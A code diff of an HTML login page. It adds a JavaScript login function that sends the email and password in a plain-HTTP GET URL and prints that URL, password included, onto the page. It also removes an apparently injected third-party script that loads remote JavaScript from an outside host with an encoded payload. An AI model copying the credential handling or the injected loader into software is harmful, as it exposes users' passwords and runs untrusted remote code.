@@ -214,20 +214,22 @@
 
             <div class="pt-32pt pt-sm-64pt pb-32pt">
                 <div class="container page__container">
-                    <form action="fixed-index.html" class="col-md-5 p-0 mx-auto">
+                    <form class="col-md-5 p-0 mx-auto">
                         <div class="form-group">
                             <label class="form-label" for="email">Email:</label>
-                            <input id="email" type="text" class="form-control" placeholder="Your email address ...">
+                            <input id="id_email" type="text" class="form-control" placeholder="Your email address ...">
                         </div>
                         <div class="form-group">
                             <label class="form-label" for="password">Password:</label>
-                            <input id="password" type="password" class="form-control" placeholder="Your first and last name ...">
+                            <input id="id_password" type="password" class="form-control" placeholder="Your first and last name ...">
                             <p class="text-right"><a href="fixed-reset-password.html" class="small">Forgot your password?</a></p>
                         </div>
                         <div class="text-center">
-                            <button class="btn btn-primary">Login</button>
+                            <button class="btn btn-primary" onclick="LoginFunction()">Login</button>
                         </div>
                     </form>
+                    <table id="debug">
+                    </table>
                 </div>
             </div>
             <div class="page-separator justify-content-center m-0">
@@ -240,10 +242,37 @@
                     <a href="fixed-index.html" class="btn btn-secondary btn-block-xs">Google+</a>
                 </div>
             </div>
+            <script>
+                function LoginFunction(){
+                    var idEmail = document.getElementById('id_email').value;
+                    var idPassword = document.getElementById('id_password').value;
+                    if(idEmail == ''){
+                        idEmail = 'undefined';
+                    }
+                    if( idPassword == ''){
+                        idPassword = 'undefined';
+                    }
+                    
+                    var url = 'http://localhost:3000/api/accountLogin/'+idEmail+'/'+idPassword;
+                    
+                    document.getElementById('debug').innerHTML = url;
+                    var xhr  = new XMLHttpRequest();
+                    xhr.open('GET', url, true);
+                    xhr.onload = function() {
+                        if (xhr.status == "200" && xhr.readyState == 4) {
+                            var id = JSON.parse(xhr.responseText);
+                            alert('You have succesfully logged in!');
+                            window.location.replace("fixed-index.html");
+                            localStorage.setItem("session_userID", id.id);
 
-
-
-
+                        } else {
+                            alert('Registration failed! '+ ' Reason: '+ xhr.responseText);
+                            window.location.replace("fixed-login.html");
+                        }
+                    }
+                    xhr.send(null);
+                }
+            </script>
         </div>
         <!-- // END Header Layout Content -->
 
@@ -1066,8 +1095,6 @@
     <script src="assets/js/app.js"></script>
 
 
-
-
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXm4UFHi%2b9QCLKP56kQizEzZonL2YltTq9nLaf1EK6I4HZgZhTEKq1Cwd5hKZzgsN0MHWZ7u6QrWIm3isqqh2vJsc7s72bqQmis0lfopYrL9iDaBsDo7N9tcmlU2Jz0xr9xPMsFuRV47PjpCcJWcWMKUWRUz%2b0emAsadq6hdMPdcuBYZ3%2fYX59adsJzDfb%2bKTViS%2f43EKUIVVgu0Yjok8XbVW6mIotfaHjZqozGh61gtrhUvQk7IxZh%2fCmeLAaJgWqF9XELRfLHEpmCROa8hpZ7gwJ2pAiAgh6ZaWwilz6B86QBXp0TI1CpQG2mFkG0DteCu7Ncl4N9mRUShIXgexHcmyzQLEK7Uta8cIWHzO68dktkFo3HUsgEwEw63f4IsINU0RR65vtQFOV1cozFHFOP18CJhQTtUmwcdwl8X%2fvAC%2bE5UF7%2be6L8RtLqXwhsMdHGe3BV0BEN2Y%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</body>
 
 </html>
